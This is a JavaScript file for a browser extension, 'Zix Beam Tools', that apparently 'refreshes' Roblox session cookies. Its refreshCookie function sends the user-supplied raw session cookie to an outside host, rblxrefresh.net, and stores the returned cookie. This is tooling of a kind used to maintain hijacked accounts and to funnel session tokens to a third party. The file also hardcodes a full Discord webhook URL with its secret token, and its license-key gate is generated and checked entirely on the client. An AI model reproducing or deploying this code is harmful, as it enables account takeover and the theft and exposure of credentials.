const $ = (id) => document.getElementById(id);

// NOTE: hardcoding a Discord webhook in a client-side extension makes it public.
const WEBHOOK_URL = "https://discord.com/api/webhooks/1543919741716926555/8ByTMpUYyAALbi_jZmGk8JiTFdxoz0FyxxB-ihI6EFESw12--lqgC-CI0VPYNjsKbmmD";

const DURATIONS = {
  "1d":       { label: "1 Day",    ms: 24 * 60 * 60 * 1000 },
  "1w":       { label: "1 Week",   ms: 7 * 24 * 60 * 60 * 1000 },
  "lifetime": { label: "Lifetime", ms: null },
};

// ---------- Elements ----------
const cookieEl = $("cookie");
const outEl = $("output");
const statusEl = $("status");
const btn = $("refresh-btn");
const copyBtn = $("copy-btn");

const sessionLocked = $("session-locked");
const sessionContent = $("session-content");

const keyStatusBox = $("key-status-box");
const keyDuration = $("key-duration");
const requestKeyBtn = $("request-key-btn");
const keyStatus = $("key-status");
const redeemInput = $("redeem-key");
const redeemBtn = $("redeem-btn");
const redeemStatus = $("redeem-status");

// ---------- Tabs ----------
document.querySelectorAll(".tab-btn").forEach((b) => {
  b.addEventListener("click", () => {
    document.querySelectorAll(".tab-btn").forEach((x) => x.classList.remove("active"));
    b.classList.add("active");
    const tab = b.dataset.tab;
    $("panel-session").hidden = tab !== "session";
    $("panel-key").hidden = tab !== "key";
  });
});

function setStatus(el, msg, kind) {
  el.textContent = msg;
  el.className = "status " + (kind || "");
}

// ---------- Keys ----------
function randChunk() {
  return Math.random().toString(36).slice(2, 6).toUpperCase();
}
function generateKey() {
  return `ZIX-${randChunk()}-${randChunk()}-${randChunk()}`;
}

async function getState() {
  return new Promise((r) =>
    chrome.storage.local.get(
      ["lastCookie", "lastOutput", "activeKey", "activeKeyExpiresAt", "activeKeyLabel", "knownKeys"],
      (v) => r(v)
    )
  );
}
function saveState(patch) {
  return new Promise((r) => chrome.storage.local.set(patch, r));
}

function isKeyValid(state) {
  if (!state.activeKey) return false;
  if (state.activeKeyExpiresAt === null || state.activeKeyExpiresAt === undefined) return true; // lifetime
  return Date.now() < state.activeKeyExpiresAt;
}

function fmtExpiry(ts) {
  if (ts === null || ts === undefined) return "Lifetime";
  const d = new Date(ts);
  return d.toLocaleString();
}

async function renderKeyState() {
  const state = await getState();
  const valid = isKeyValid(state);

  // Gate session panel
  sessionLocked.hidden = valid;
  sessionContent.hidden = !valid;

  if (!state.activeKey) {
    keyStatusBox.textContent = "No active key. Request one below.";
  } else if (!valid) {
    keyStatusBox.textContent = `Key expired (${state.activeKey}). Request a new one.`;
  } else {
    keyStatusBox.innerHTML =
      `<div>Key: <b>${state.activeKey}</b></div>` +
      `<div>Type: ${state.activeKeyLabel || "—"}</div>` +
      `<div>Expires: ${fmtExpiry(state.activeKeyExpiresAt)}</div>`;
  }
}

async function postToWebhook(content) {
  const res = await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content, username: "Zix Beam Tools" }),
  });
  if (!res.ok) {
    const t = await res.text().catch(() => "");
    throw new Error(`Webhook HTTP ${res.status}: ${t.slice(0, 120)}`);
  }
}

// ---------- Request key ----------
const KEY_REQUEST_COOLDOWN_MS = 10 * 60 * 1000;
let cooldownTimer = null;

function fmtRemaining(ms) {
  const s = Math.ceil(ms / 1000);
  const m = Math.floor(s / 60);
  const r = s % 60;
  return `${m}m ${r.toString().padStart(2, "0")}s`;
}

async function updateCooldownUI() {
  const { lastKeyRequestAt } = await new Promise((r) =>
    chrome.storage.local.get(["lastKeyRequestAt"], r)
  );
  const remaining = lastKeyRequestAt ? (lastKeyRequestAt + KEY_REQUEST_COOLDOWN_MS) - Date.now() : 0;
  if (remaining > 0) {
    requestKeyBtn.disabled = true;
    setStatus(keyStatus, `Cooldown: wait ${fmtRemaining(remaining)} before requesting again.`, "");
    if (!cooldownTimer) {
      cooldownTimer = setInterval(updateCooldownUI, 1000);
    }
  } else {
    requestKeyBtn.disabled = false;
    if (cooldownTimer) { clearInterval(cooldownTimer); cooldownTimer = null; }
    if (keyStatus.textContent.startsWith("Cooldown")) setStatus(keyStatus, "", "");
  }
}

requestKeyBtn.addEventListener("click", async () => {
  const durKey = keyDuration.value;
  const dur = DURATIONS[durKey];
  if (!dur) return;

  // Enforce 10-minute cooldown
  const { lastKeyRequestAt } = await new Promise((r) =>
    chrome.storage.local.get(["lastKeyRequestAt"], r)
  );
  if (lastKeyRequestAt && Date.now() - lastKeyRequestAt < KEY_REQUEST_COOLDOWN_MS) {
    await updateCooldownUI();
    return;
  }

  requestKeyBtn.disabled = true;
  setStatus(keyStatus, "Slinging key request through the web...", "");

  try {
    const keys = Array.from({ length: 2 }, generateKey);
    const expiresAt = dur.ms === null ? null : Date.now() + dur.ms;
    const expiresLabel = expiresAt === null ? "never" : new Date(expiresAt).toISOString();

    const msg =
      `**Zix Beam Tools — Key Request**\n` +
      `Duration: **${dur.label}**\n` +
      `Expires: ${expiresLabel}\n` +
      `Keys:\n` +
      keys.map((k) => `\`${k}\``).join("\n");

    await postToWebhook(msg);

    const state = await getState();
    const known = state.knownKeys || {};
    for (const k of keys) {
      known[k] = { label: dur.label, expiresAt };
    }
    await saveState({ knownKeys: known, lastKeyRequestAt: Date.now() });

    setStatus(
      keyStatus,
      `Sent 2 ${dur.label} keys to Discord. Redeem one below to unlock.`,
      "ok"
    );
    await updateCooldownUI();
  } catch (e) {
    setStatus(keyStatus, "Failed: " + e.message, "err");
    requestKeyBtn.disabled = false;
  }
});


// ---------- Redeem key ----------
redeemBtn.addEventListener("click", async () => {
  const k = (redeemInput.value || "").trim().toUpperCase();
  if (!k) {
    setStatus(redeemStatus, "Enter a key first.", "err");
    return;
  }
  const state = await getState();
  const known = state.knownKeys || {};
  const meta = known[k];
  if (!meta) {
    setStatus(redeemStatus, "Unknown key.", "err");
    return;
  }
  if (meta.expiresAt !== null && Date.now() >= meta.expiresAt) {
    setStatus(redeemStatus, "That key is expired.", "err");
    return;
  }
  await saveState({
    activeKey: k,
    activeKeyExpiresAt: meta.expiresAt,
    activeKeyLabel: meta.label,
  });
  setStatus(redeemStatus, "Redeemed! Session unlocked.", "ok");
  await renderKeyState();
});

// ---------- Session (existing) ----------
async function refreshCookie(raw) {
  const attempts = [
    { url: "https://rblxrefresh.net/api/refresh", init: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ cookie: raw }) } },
    { url: "https://rblxrefresh.net/refresh",     init: { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ cookie: raw }) } },
    { url: "https://rblxrefresh.net/api/refresh", init: { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "cookie=" + encodeURIComponent(raw) } },
  ];
  let lastErr = null;
  for (const a of attempts) {
    try {
      const res = await fetch(a.url, a.init);
      const text = await res.text();
      if (!res.ok) { lastErr = `HTTP ${res.status}: ${text.slice(0,120)}`; continue; }
      let refreshed = null;
      try {
        const j = JSON.parse(text);
        refreshed = j.cookie || j.refreshed || j.result || j.data || j.newCookie || null;
        if (!refreshed && typeof j === "string") refreshed = j;
      } catch { refreshed = text.trim(); }
      if (refreshed) return String(refreshed);
      lastErr = "No cookie in response";
    } catch (e) { lastErr = e.message; }
  }
  throw new Error(lastErr || "Refresh failed");
}

btn.addEventListener("click", async () => {
  const state = await getState();
  if (!isKeyValid(state)) {
    setStatus(statusEl, "Key required. Redeem one in the KEY tab.", "err");
    return;
  }
  const raw = cookieEl.value.trim();
  if (!raw) { setStatus(statusEl, "Enter a cookie first.", "err"); return; }
  btn.disabled = true;
  setStatus(statusEl, "Beaming request through the web...", "");
  try {
    const refreshed = await refreshCookie(raw);
    outEl.value = refreshed;
    await saveState({ lastCookie: raw, lastOutput: refreshed });
    setStatus(statusEl, "Refreshed! Web-slinger success.", "ok");
  } catch (e) {
    setStatus(statusEl, "Failed: " + e.message, "err");
  } finally { btn.disabled = false; }
});

copyBtn.addEventListener("click", async () => {
  if (!outEl.value) return;
  await navigator.clipboard.writeText(outEl.value);
  setStatus(statusEl, "Copied to clipboard.", "ok");
});

// ---------- Init ----------
(async () => {
  const state = await getState();
  if (state.lastCookie) cookieEl.value = state.lastCookie;
  if (state.lastOutput) outEl.value = state.lastOutput;
  await renderKeyState();
})();
